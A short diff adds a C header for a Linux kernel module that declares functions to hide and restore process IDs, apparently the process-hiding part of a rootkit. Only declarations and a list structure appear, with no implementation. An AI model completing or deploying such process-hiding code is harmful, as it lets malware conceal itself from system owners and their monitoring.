@@ -1,0 +1,18 @@
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/list.h>
+#include <linux/pid.h>
+#include <linux/sched.h>
+#include <linux/init_task.h>
+
+static struct list_head hide_list_head=LIST_HEAD_INIT(hide_list_head);
+
+struct hide_node{
+  pid_t pid;
+  struct task_struct *task_use;
+  struct list_head node;
+};
+
+int hide_pid(pid_t a);
+int recover_hide_pid(pid_t a);
+int recover_hide_pid_all(void);
